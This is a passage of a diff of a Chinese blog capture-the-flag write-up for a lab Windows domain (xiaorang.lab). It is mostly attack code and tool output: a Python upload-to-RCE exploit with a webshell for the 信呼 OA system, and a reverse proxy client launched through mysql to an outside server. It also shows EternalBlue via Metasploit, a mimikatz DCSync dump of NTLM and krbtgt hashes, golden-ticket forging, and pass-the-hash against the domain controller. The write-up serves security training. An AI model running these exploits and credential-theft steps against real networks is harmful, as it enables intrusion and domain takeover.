open<br>172.22.1.18:135 open<br>172.22.1.2:135 open<br>172.22.1.18:80 open<br>172.22.1.15:80 open<br>172.22.1.2:88 open<br>172.22.1.18:3306 open<br>172.22.1.21:445 open<br>172.22.1.18:445 open<br>172.22.1.2:445 open<br>172.22.1.21:139 open<br>[*] 172.22.1.2  (Windows Server 2016 Datacenter 14393)<br>[*] NetInfo:<br>[*]172.22.1.2<br>   [-&gt;]DC01<br>   [-&gt;]172.22.1.2<br>[*] NetInfo:<br>[*]172.22.1.18<br>   [-&gt;]XIAORANG-OA01<br>   [-&gt;]172.22.1.18<br>[*] NetInfo:<br>[*]172.22.1.21<br>   [-&gt;]XIAORANG-WIN7<br>   [-&gt;]172.22.1.21<br>[+] 172.22.1.21    MS17-010    (Windows Server 2008 R2 Enterprise 7601 Service Pack 1)<br>[*] NetBios: 172.22.1.21     XIAORANG-WIN7.xiaorang.lab          Windows Server 2008 R2 Enterprise 7601 Service Pack 1 <br>[*] NetBios: 172.22.1.2      [+]DC DC01.xiaorang.lab             Windows Server 2016 Datacenter 14393 <br>[*] WebTitle: http://172.22.1.15        code:200 len:5578   title:Bootstrap Material Admin<br>[*] NetBios: 172.22.1.18     XIAORANG-OA01.xiaorang.lab          Windows Server 2012 R2 Datacenter 9600 <br>[*] WebTitle: http://172.22.1.18        code:302 len:0      title:None 跳转url: http://172.22.1.18?m=login<br>[*] WebTitle: http://172.22.1.18?m=login code:200 len:4012   title:信呼协同办公系统<br>[+] http://172.22.1.15 poc-yaml-thinkphp5023-method-rce poc1<br></code></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">(www-data:/tmp) $ <span class="built_in">cat</span> result.txt</span><br><span class="line">172.22.1.15:22 open</span><br><span class="line">172.22.1.2:139 open</span><br><span class="line">172.22.1.18:139 open</span><br><span class="line">172.22.1.21:135 open</span><br><span class="line">172.22.1.18:135 open</span><br><span class="line">172.22.1.2:135 open</span><br><span class="line">172.22.1.18:80 open</span><br><span class="line">172.22.1.15:80 open</span><br><span class="line">172.22.1.2:88 open</span><br><span class="line">172.22.1.18:3306 open</span><br><span class="line">172.22.1.21:445 open</span><br><span class="line">172.22.1.18:445 open</span><br><span class="line">172.22.1.2:445 open</span><br><span class="line">172.22.1.21:139 open</span><br><span class="line">[*] 172.22.1.2  (Windows Server 2016 Datacenter 14393)</span><br><span class="line">[*] NetInfo:</span><br><span class="line">[*]172.22.1.2</span><br><span class="line">   [-&gt;]DC01</span><br><span class="line">   [-&gt;]172.22.1.2</span><br><span class="line">[*] NetInfo:</span><br><span class="line">[*]172.22.1.18</span><br><span class="line">   [-&gt;]XIAORANG-OA01</span><br><span class="line">   [-&gt;]172.22.1.18</span><br><span class="line">[*] NetInfo:</span><br><span class="line">[*]172.22.1.21</span><br><span class="line">   [-&gt;]XIAORANG-WIN7</span><br><span class="line">   [-&gt;]172.22.1.21</span><br><span class="line">[+] 172.22.1.21    MS17-010    (Windows Server 2008 R2 Enterprise 7601 Service Pack 1)</span><br><span class="line">[*] NetBios: 172.22.1.21     XIAORANG-WIN7.xiaorang.lab          Windows Server 2008 R2 Enterprise 7601 Service Pack 1 </span><br><span class="line">[*] NetBios: 172.22.1.2      [+]DC DC01.xiaorang.lab             Windows Server 2016 Datacenter 14393 </span><br><span class="line">[*] WebTitle: http://172.22.1.15        code:200 len:5578   title:Bootstrap Material Admin</span><br><span class="line">[*] NetBios: 172.22.1.18     XIAORANG-OA01.xiaorang.lab          Windows Server 2012 R2 Datacenter 9600 </span><br><span class="line">[*] WebTitle: http://172.22.1.18        code:302 len:0      title:None 跳转url: http://172.22.1.18?m=login</span><br><span class="line">[*] WebTitle: http://172.22.1.18?m=login code:200 len:4012   title:信呼协同办公系统</span><br><span class="line">[+] http://172.22.1.15 poc-yaml-thinkphp5023-method-rce poc1</span><br></pre></td></tr></table></figure>
 
 <p>nps代理</p>
 <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_44159028/article/details/122719330">nps+Proxifier搭建socks5代理隧道进行内网穿透<em>nps socks5</em>~Echo的博客-CSDN博客</a></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo mysql -e <span class="hljs-string">&#x27;\! ./npc -server=121.43.55.52:8024 -vkey=l1odwdre7k8qlid2 -type=tcp&#x27;</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo mysql -e <span class="string">&#x27;\! ./npc -server=121.43.55.52:8024 -vkey=l1odwdre7k8qlid2 -type=tcp&#x27;</span></span><br></pre></td></tr></table></figure>
 
 <p>先打信呼协同办公系统</p>
-<p><img src="/img/blogimg/Initial/1704332561841-80455797-aa2f-4b07-a53a-77c79fd95ebe.png" srcset="/img/loading.gif" lazyload></p>
+<p><img   src="/images/blogimg/Initial/1704332561841-80455797-aa2f-4b07-a53a-77c79fd95ebe.png" ></p>
 <p>admin:admin123弱口令登录</p>
-<p>[<a target="_blank" rel="noopener" href="https://blog.csdn.net/solitudi/article/details/118675321">代码审计]信呼协同办公系统2.2存在文件上传配合云处理函数组合拳RCE_信呼2.2.8 漏洞-CSDN博客</a></p>
+<p>[<a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/solitudi/article/details/118675321" >代码审计]信呼协同办公系统2.2存在文件上传配合云处理函数组合拳RCE_信呼2.2.8 漏洞-CSDN博客<i class="fas fa-external-link-alt"></i></a></p>
 <p>exp</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs bash">import requests<br><br>session = requests.session()<br><br>url_pre = <span class="hljs-string">&#x27;http://172.22.1.18/&#x27;</span><br>url1 = url_pre + <span class="hljs-string">&#x27;?a=check&amp;m=login&amp;d=&amp;ajaxbool=true&amp;rnd=533953&#x27;</span><br>url2 = url_pre + <span class="hljs-string">&#x27;/index.php?a=upfile&amp;m=upload&amp;d=public&amp;maxsize=100&amp;ajaxbool=true&amp;rnd=798913&#x27;</span><br>url3 = url_pre + <span class="hljs-string">&#x27;/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=11&#x27;</span><br><br>data1 = &#123;<br>    <span class="hljs-string">&#x27;rempass&#x27;</span>: <span class="hljs-string">&#x27;0&#x27;</span>,<br>    <span class="hljs-string">&#x27;jmpass&#x27;</span>: <span class="hljs-string">&#x27;false&#x27;</span>,<br>    <span class="hljs-string">&#x27;device&#x27;</span>: <span class="hljs-string">&#x27;1625884034525&#x27;</span>,<br>    <span class="hljs-string">&#x27;ltype&#x27;</span>: <span class="hljs-string">&#x27;0&#x27;</span>,<br>    <span class="hljs-string">&#x27;adminuser&#x27;</span>: <span class="hljs-string">&#x27;YWRtaW4=&#x27;</span>,<br>    <span class="hljs-string">&#x27;adminpass&#x27;</span>: <span class="hljs-string">&#x27;YWRtaW4xMjM=&#x27;</span>,<br>    <span class="hljs-string">&#x27;yanzm&#x27;</span>: <span class="hljs-string">&#x27;&#x27;</span><br>&#125;<br><br>r = session.post(url1, data=data1)<br>r = session.post(url2, files=&#123;<span class="hljs-string">&#x27;file&#x27;</span>: open(<span class="hljs-string">&#x27;1.php&#x27;</span>, <span class="hljs-string">&#x27;r+&#x27;</span>)&#125;)<br><br>filepath = str(r.json()[<span class="hljs-string">&#x27;filepath&#x27;</span>])<br>filepath = <span class="hljs-string">&quot;/&quot;</span> + filepath.split(<span class="hljs-string">&#x27;.uptemp&#x27;</span>)[0] + <span class="hljs-string">&#x27;.php&#x27;</span><br><span class="hljs-built_in">id</span> = r.json()[<span class="hljs-string">&#x27;id&#x27;</span>]<br><br>url3 = url_pre + f<span class="hljs-string">&#x27;/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=&#123;id&#125;&#x27;</span><br><br>r = session.get(url3)<br>r = session.get(url_pre + filepath + <span class="hljs-string">&quot;?1=system(&#x27;dir&#x27;);&quot;</span>)<br><span class="hljs-built_in">print</span>(r.text)<br></code></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">session = requests.session()</span><br><span class="line"></span><br><span class="line">url_pre = <span class="string">&#x27;http://172.22.1.18/&#x27;</span></span><br><span class="line">url1 = url_pre + <span class="string">&#x27;?a=check&amp;m=login&amp;d=&amp;ajaxbool=true&amp;rnd=533953&#x27;</span></span><br><span class="line">url2 = url_pre + <span class="string">&#x27;/index.php?a=upfile&amp;m=upload&amp;d=public&amp;maxsize=100&amp;ajaxbool=true&amp;rnd=798913&#x27;</span></span><br><span class="line">url3 = url_pre + <span class="string">&#x27;/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=11&#x27;</span></span><br><span class="line"></span><br><span class="line">data1 = &#123;</span><br><span class="line">    <span class="string">&#x27;rempass&#x27;</span>: <span class="string">&#x27;0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;jmpass&#x27;</span>: <span class="string">&#x27;false&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;device&#x27;</span>: <span class="string">&#x27;1625884034525&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;ltype&#x27;</span>: <span class="string">&#x27;0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;adminuser&#x27;</span>: <span class="string">&#x27;YWRtaW4=&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;adminpass&#x27;</span>: <span class="string">&#x27;YWRtaW4xMjM=&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;yanzm&#x27;</span>: <span class="string">&#x27;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r = session.post(url1, data=data1)</span><br><span class="line">r = session.post(url2, files=&#123;<span class="string">&#x27;file&#x27;</span>: open(<span class="string">&#x27;1.php&#x27;</span>, <span class="string">&#x27;r+&#x27;</span>)&#125;)</span><br><span class="line"></span><br><span class="line">filepath = str(r.json()[<span class="string">&#x27;filepath&#x27;</span>])</span><br><span class="line">filepath = <span class="string">&quot;/&quot;</span> + filepath.split(<span class="string">&#x27;.uptemp&#x27;</span>)[0] + <span class="string">&#x27;.php&#x27;</span></span><br><span class="line"><span class="built_in">id</span> = r.json()[<span class="string">&#x27;id&#x27;</span>]</span><br><span class="line"></span><br><span class="line">url3 = url_pre + f<span class="string">&#x27;/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=&#123;id&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">r = session.get(url3)</span><br><span class="line">r = session.get(url_pre + filepath + <span class="string">&quot;?1=system(&#x27;dir&#x27;);&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>
 
 <p>在同目录下新建一个1.php，写入一句话木马</p>
-<p><img src="/img/blogimg/Initial/1704332597688-808e5b85-1101-4a2e-9fe9-c590061583df.png" srcset="/img/loading.gif" lazyload></p>
-<p><img src="/img/blogimg/Initial/1704332611935-3e0a1a3e-5739-4ce6-916b-d9ffa7a266fc.png" srcset="/img/loading.gif" lazyload></p>
+<p><img   src="/images/blogimg/Initial/1704332597688-808e5b85-1101-4a2e-9fe9-c590061583df.png" ></p>
+<p><img   src="/images/blogimg/Initial/1704332611935-3e0a1a3e-5739-4ce6-916b-d9ffa7a266fc.png" ></p>
 <p>C:&#x2F;Users&#x2F;Administrator&#x2F;flag&#x2F;flag02.txt</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">___    ___ ___  ________  ________  ________  ________  ________   ________     <br>|\  \  /  /|\  \|\   __  \|\   __  \|\   __  \|\   __  \|\   ___  \|\   ____\    <br>\ \  \/  / | \  \ \  \|\  \ \  \|\  \ \  \|\  \ \  \|\  \ \  \\ \  \ \  \___|    <br> \ \    / / \ \  \ \   __  \ \  \\\  \ \   _  _\ \   __  \ \  \\ \  \ \  \  ___  <br>  /     \/   \ \  \ \  \ \  \ \  \\\  \ \  \\  \\ \  \ \  \ \  \\ \  \ \  \|\  \ <br> /  /\   \    \ \__\ \__\ \__\ \_______\ \__\\ _\\ \__\ \__\ \__\\ \__\ \_______\<br>/__/ /\ __\    \|__|\|__|\|__|\|_______|\|__|\|__|\|__|\|__|\|__| \|__|\|_______|<br>|__|/ \|__|                                                                      <br><br>flag02: 2ce3-4813-87d4-<br><br>Awesome! ! ! You found the second flag, now you can attack the domain controller.<br></code></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">___    ___ ___  ________  ________  ________  ________  ________   ________     </span><br><span class="line">|\  \  /  /|\  \|\   __  \|\   __  \|\   __  \|\   __  \|\   ___  \|\   ____\    </span><br><span class="line">\ \  \/  / | \  \ \  \|\  \ \  \|\  \ \  \|\  \ \  \|\  \ \  \\ \  \ \  \___|    </span><br><span class="line"> \ \    / / \ \  \ \   __  \ \  \\\  \ \   _  _\ \   __  \ \  \\ \  \ \  \  ___  </span><br><span class="line">  /     \/   \ \  \ \  \ \  \ \  \\\  \ \  \\  \\ \  \ \  \ \  \\ \  \ \  \|\  \ </span><br><span class="line"> /  /\   \    \ \__\ \__\ \__\ \_______\ \__\\ _\\ \__\ \__\ \__\\ \__\ \_______\</span><br><span class="line">/__/ /\ __\    \|__|\|__|\|__|\|_______|\|__|\|__|\|__|\|__|\|__| \|__|\|_______|</span><br><span class="line">|__|/ \|__|                                                                      </span><br><span class="line"></span><br><span class="line">flag02: 2ce3-4813-87d4-</span><br><span class="line"></span><br><span class="line">Awesome! ! ! You found the second flag, now you can attack the domain controller.</span><br></pre></td></tr></table></figure>
 
 <h1 id="flag03"><a href="#flag03" class="headerlink" title="flag03"></a>flag03</h1><p>kali设置一下代理，服务器nps的端口</p>
-<p><img src="/img/blogimg/Initial/1704332641380-5951cc87-8d7e-49e2-98ef-d913d15cf6fd.png" srcset="/img/loading.gif" lazyload></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">vim /etc/proxychains4.conf<br>socks5        121.43.55.52 7777<br></code></pre></td></tr></table></figure>
+<p><img   src="/images/blogimg/Initial/1704332641380-5951cc87-8d7e-49e2-98ef-d913d15cf6fd.png" ></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/proxychains4.conf</span><br><span class="line">socks5        121.43.55.52 7777</span><br></pre></td></tr></table></figure>
 
 <p>用msf打永恒之蓝</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">proxychains msfconsole<br>use exploit/windows/smb/ms17_010_eternalblue<br><span class="hljs-built_in">set</span> payload windows/x64/meterpreter/bind_tcp_uuid<br><span class="hljs-built_in">set</span> RHOSTS 172.22.1.21<br>exploit<br></code></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">proxychains msfconsole</span><br><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line"><span class="built_in">set</span> payload windows/x64/meterpreter/bind_tcp_uuid</span><br><span class="line"><span class="built_in">set</span> RHOSTS 172.22.1.21</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
 
 <p>利用DCSync</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><code class="hljs bash">meterpreter &gt; load kiwi<br>[proxychains] DLL init: proxychains-ng 4.16<br>[proxychains] DLL init: proxychains-ng 4.16<br>Loading extension kiwi...<br>  .<span class="hljs-comment">#####.   mimikatz 2.2.0 20191125 (x64/windows)</span><br> .<span class="hljs-comment">## ^ ##.  &quot;A La Vie, A L&#x27;Amour&quot; - (oe.eo)</span><br> <span class="hljs-comment">## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span><br> <span class="hljs-comment">## \ / ##       &gt; http://blog.gentilkiwi.com/mimikatz</span><br> <span class="hljs-string">&#x27;## v ##&#x27;</span>        Vincent LE TOUX            ( vincent.letoux@gmail.com )<br>  <span class="hljs-string">&#x27;#####&#x27;</span>         &gt; http://pingcastle.com / http://mysmartlogon.com  ***/<br><br>Success.<br><br>meterpreter &gt; kiwi_cmd lsadump::dcsync /domain:xiaorang.lab /all /csv<br>[proxychains] DLL init: proxychains-ng 4.16<br>[proxychains] DLL init: proxychains-ng 4.16<br>[DC] <span class="hljs-string">&#x27;xiaorang.lab&#x27;</span> will be the domain<br>[DC] <span class="hljs-string">&#x27;DC01.xiaorang.lab&#x27;</span> will be the DC server<br>[DC] Exporting domain <span class="hljs-string">&#x27;xiaorang.lab&#x27;</span><br>[rpc] Service  : ldap<br>[rpc] AuthnSvc : GSS_NEGOTIATE (9)<br>502     krbtgt  fb812eea13a18b7fcdb8e6d67ddc205b        514<br>1106    Marcus  e07510a4284b3c97c8e7dee970918c5c        512<br>1107    Charles f6a9881cd5ae709abb4ac9ab87f24617        512<br>500     Administrator   10cf89a850fb1cdbe6bb432b859164c8        512<br>1000    DC01$   34b07f0e507a89afd072a38a87d9ade7        532480<br>1104    XIAORANG-OA01$  6e044889fa255c3d36a379f86cde1c5f        4096<br>1108    XIAORANG-WIN7$  1cd853447da375a93c53bf8c03d3068e        4096<br><br><span class="hljs-comment"># 生成黄金票据</span><br>meterpreter &gt; kiwi_cmd lsadump::dcsync /domain:xiaorang.lab /user:krbtgt<br>[proxychains] DLL init: proxychains-ng 4.16<br>[proxychains] DLL init: proxychains-ng 4.16<br>[DC] <span class="hljs-string">&#x27;xiaorang.lab&#x27;</span> will be the domain<br>[DC] <span class="hljs-string">&#x27;DC01.xiaorang.lab&#x27;</span> will be the DC server<br>[DC] <span class="hljs-string">&#x27;krbtgt&#x27;</span> will be the user account<br>[rpc] Service  : ldap<br>[rpc] AuthnSvc : GSS_NEGOTIATE (9)<br><br>Object RDN           : krbtgt<br><br>** SAM ACCOUNT **<br><br>SAM Username         : krbtgt<br>Account Type         : 30000000 ( USER_OBJECT )<br>User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )<br>Account expiration   : <br>Password last change : 2022/6/5 20:40:39<br>Object Security ID   : S-1-5-21-314492864-3856862959-4045974917-502<br>Object Relative ID   : 502<br><br>Credentials:<br>  Hash NTLM: fb812eea13a18b7fcdb8e6d67ddc205b<br>    ntlm- 0: fb812eea13a18b7fcdb8e6d67ddc205b<br>    lm  - 0: c4f45322c850c77aecb3aa71c2e44c1e<br><br>Supplemental Credentials:<br>* Primary:NTLM-Strong-NTOWF *<br>    Random Value : 849f7f8ab6eb3b3a1c7c926de5ee5574<br><br>* Primary:Kerberos-Newer-Keys *<br>    Default Salt : XIAORANG.LABkrbtgt<br>    Default Iterations : 4096<br>    Credentials<br>      aes256_hmac       (4096) : acbbedcabc9ad1d8638cda298e15761626e1bce7ce80eae90d95252f8162bba8<br>      aes128_hmac       (4096) : 207ea00513bdf19042937aa38c9ad2dd<br>      des_cbc_md5       (4096) : c70ee386138c7016<br><br>* Primary:Kerberos *<br>    Default Salt : XIAORANG.LABkrbtgt<br>    Credentials<br>      des_cbc_md5       : c70ee386138c7016<br><br><span class="hljs-comment"># 导入黄金票据</span><br>meterpreter &gt; kiwi_cmd kerberos::golden /user:administrator /domain:xiaorang.lab /sid:S-1-5-21-314492864-3856862959-4045974917-502 /krbtgt:fb812eea13a18b7fcdb8e6d67ddc205b /ptt<br>[proxychains] DLL init: proxychains-ng 4.16<br>[proxychains] DLL init: proxychains-ng 4.16<br>User      : administrator<br>Domain    : xiaorang.lab (XIAORANG)<br>SID       : S-1-5-21-314492864-3856862959-4045974917-502<br>User Id   : 500<br>Groups Id : *513 512 520 518 519 <br>ServiceKey: fb812eea13a18b7fcdb8e6d67ddc205b - rc4_hmac_nt      <br>Lifetime  : 2023/10/22 15:33:33 ; 2033/10/19 15:33:33 ; 2033/10/19 15:33:33<br>-&gt; Ticket : ** Pass The Ticket **<br><br> * PAC generated<br> * PAC signed<br> * EncTicketPart generated<br> * EncTicketPart encrypted<br> * KrbCred generated<br><br>Golden ticket <span class="hljs-keyword">for</span> <span class="hljs-string">&#x27;administrator @ xiaorang.lab&#x27;</span> successfully submitted <span class="hljs-keyword">for</span> current session<br><br><span class="hljs-comment"># wmiexec哈希传递</span><br><span class="hljs-comment"># msf转shell半天转不过来，换个方式</span><br><span class="hljs-comment"># msf转shell后的利用方式：wmiexec.exe -hashes :10cf89a850fb1cdbe6bb432b859164c8 xiaorang/administrator@172.22.1.2 &quot;type Users\Administrator\flag\flag03.txt&quot;</span><br>⚡ root@kali  ~  proxychains4 crackmapexec smb 172.22.1.2 -u administrator -H10cf89a850fb1cdbe6bb432b859164c8 -d xiaorang.lab -x <span class="hljs-string">&quot;type Users\Administrator\flag\flag03.txt&quot;</span><br>[proxychains] config file found: /etc/proxychains4.conf<br>[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4<br>[proxychains] DLL init: proxychains-ng 4.16<br>[*] First time use detected<br>[*] Creating home directory structure<br>[*] Creating default workspace<br>[*] Initializing FTP protocol database<br>[*] Initializing MSSQL protocol database<br>[*] Initializing RDP protocol database<br>[*] Initializing WINRM protocol database<br>[*] Initializing LDAP protocol database<br>[*] Initializing SSH protocol database<br>[*] Initializing SMB protocol database<br>[*] Copying default configuration file<br>[*] Generating SSL certificate<br>[proxychains] DLL init: proxychains-ng 4.16<br>[proxychains] Strict chain  ...  121.43.55.52:7777  ...  172.22.1.2:445  ...  OK<br>[proxychains] Strict chain  ...  121.43.55.52:7777  ...  172.22.1.2:135  ...  OK<br>SMB         172.22.1.2      445    DC01             [*] Windows Server 2016 Datacenter 14393 x64 (name:DC01) (domain:xiaorang.lab) (signing:True) (SMBv1:True)<br>[proxychains] Strict chain  ...  121.43.55.52:7777  ...  172.22.1.2:445  ...  OK<br>SMB         172.22.1.2      445    DC01             [+] xiaorang.lab\administrator:10cf89a850fb1cdbe6bb432b859164c8 (Pwn3d!)<br>[proxychains] Strict chain  ...  121.43.55.52:7777  ...  172.22.1.2:135  ...  OK<br>[proxychains] Strict chain  ...  121.43.55.52:7777  ...  172.22.1.2:49668  ...  OK<br>SMB         172.22.1.2      445    DC01             [+] Executed <span class="hljs-built_in">command</span> <br>SMB         172.22.1.2      445    DC01             ___   ___<br>SMB         172.22.1.2      445    DC01             \\ / /       / /    // | |     //   ) ) //   ) )  // | |     /|    / / //   ) )<br>SMB         172.22.1.2      445    DC01             \  /       / /    //__| |    //   / / //___/ /  //__| |    //|   / / //<br>SMB         172.22.1.2      445    DC01             / /       / /    / ___  |   //   / / / ___ (   / ___  |   // |  / / //  ____<br>SMB         172.22.1.2      445    DC01             / /\\     / /    //    | |  //   / / //   | |  //    | |  //  | / / //    / /<br>SMB         172.22.1.2      445    DC01             / /  \\ __/ /___ //     | | ((___/ / //    | | //     | | //   |/ / ((____/ /<br>SMB         <span class="hljs-number">172.22</span>.<span class="hljs-number">1.2</span>      <span class="hljs-number">445</span>    DC01             <br>SMB         <span class="hljs-number">172.22</span>.<span class="hljs-number">1.2</span>      <span class="hljs-number">445</span>    DC01             <br>SMB         <span class="hljs-number">172.22</span>.<span class="hljs-number">1.2</span>      <span class="hljs-number">445</span>    DC01             flag03: e8f88d0d43d6&#125;<br>SMB         <span class="hljs-number">172.22</span>.<span class="hljs-number">1.2</span>      <span class="hljs-number">445</span>    DC01             <br>SMB         <span class="hljs-number">172.22</span>.<span class="hljs-number">1.2</span>      <span class="hljs-number">445</span>    DC01             Unbelievable! ! You found the last flag, which means you have full control over the entire domain network.<br></code></pre></td></tr></table></figure>
